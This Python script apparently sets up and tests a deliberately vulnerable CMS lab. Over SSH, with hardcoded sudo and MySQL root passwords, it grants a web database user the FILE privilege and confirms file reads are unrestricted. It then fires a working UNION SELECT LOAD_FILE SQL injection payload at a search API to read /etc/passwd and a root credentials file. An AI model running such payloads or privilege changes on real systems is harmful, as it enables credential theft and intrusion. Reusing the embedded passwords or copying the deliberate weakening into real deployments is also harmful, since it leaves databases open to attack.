#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Grant FILE privilege to cmsuser (MySQL root access confirmed), test LOAD_FILE"""
import paramiko
import sys
import codecs

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

user = 'gdadmin'
pwd = 'Gdadmin@123'

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:180]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        try:
            print(f"  {out.strip()[:2000]}")
        except:
            print(f"  [output {len(out.strip())} chars]")
    if err.strip() and ec != 0:
        try:
            print(f"  [err] {err.strip()[:300]}")
        except:
            print(f"  [err suppressed]")
    return out, err, ec

c2 = paramiko.SSHClient()
c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c2.connect('192.168.100.2', username=user, password=pwd, timeout=10)

# ============================================================
# 0. Ensure MySQL is running (it was stopped in previous script)
# ============================================================
print("="*60)
print("0. ENSURE MYSQL IS RUNNING")
print("="*60)
run(c2, "echo 'Gdadmin@123' | sudo -S systemctl start mysql 2>&1; echo START_EXIT:$?")
run(c2, "sleep 3; echo OK")
run(c2, "echo 'Gdadmin@123' | sudo -S systemctl is-active mysql")

# ============================================================
# 1. Test root access
# ============================================================
print("\n" + "="*60)
print("1. TEST MYSQL ROOT ACCESS")
print("="*60)
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e 'SELECT 1 AS connected;' 2>&1")

# ============================================================
# 2. Check current grants
# ============================================================
print("\n" + "="*60)
print("2. CHECK cmsuser GRANTS")
print("="*60)
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e \"SHOW GRANTS FOR 'cmsuser'@'%';\" 2>&1")

# ============================================================
# 3. Grant FILE privilege
# ============================================================
print("\n" + "="*60)
print("3. GRANT FILE TO cmsuser")
print("="*60)
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e \"GRANT FILE ON *.* TO 'cmsuser'@'%'; FLUSH PRIVILEGES;\" 2>&1")
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e \"GRANT FILE ON *.* TO 'cmsuser'@'localhost'; FLUSH PRIVILEGES;\" 2>&1")

# Also fix the root password to work with socket auth
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e \"ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'R00t@Mysql#2024'; FLUSH PRIVILEGES;\" 2>&1")

# Verify grants
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e \"SHOW GRANTS FOR 'cmsuser'@'%';\" 2>&1")

# ============================================================
# 4. Verify secure_file_priv is empty
# ============================================================
print("\n" + "="*60)
print("4. VERIFY secure_file_priv")
print("="*60)
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e \"SHOW VARIABLES LIKE 'secure_file_priv';\" 2>&1")

# ============================================================
# 5. Test LOAD_FILE locally on A2
# ============================================================
print("\n" + "="*60)
print("5. TEST LOAD_FILE LOCALLY ON A2")
print("="*60)
run(c2, "mysql -u cmsuser -p'Cm5Us3r@2024!' -h localhost -e \"SELECT LOAD_FILE('/etc/hostname') as result;\" 2>&1")
run(c2, "mysql -u cmsuser -p'Cm5Us3r@2024!' -h localhost -e \"SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/root.cnf') as result;\" 2>&1")

# ============================================================
# 6. Test LOAD_FILE via SQLi from A1
# ============================================================
print("\n" + "="*60)
print("6. TEST LOAD_FILE VIA SQLi")
print("="*60)
c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

# Test multiple paths
test_cases = {
    '/etc/hostname': 'hostname',
    '/etc/mysql/mysql.conf.d/root.cnf': 'root.cnf',
    '/etc/passwd': 'passwd (first line)',
}

for path, desc in test_cases.items():
    hex_path = '0x' + codecs.encode(path.encode(), 'hex').decode()
    payload = f"test%27%20UNION%20SELECT%201,LOAD_FILE({hex_path}),3,4%23"
    out, _, _ = run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")
    if out.strip():
        import json
        try:
            data = json.loads(out)
            if data.get('data'):
                title = data['data'][0].get('title')
                if title:
                    print(f"  {desc}: SUCCESS! Value: {title[:100]}")
                else:
                    print(f"  {desc}: NULL")
            elif data.get('error'):
                print(f"  {desc}: ERROR - {data['error'][:80]}")
        except Exception as e:
            print(f"  {desc}: RAW: {out.strip()[:100]}")
    else:
        print(f"  {desc}: (empty response)")

c1.close()
c2.close()
print("\nDone!")
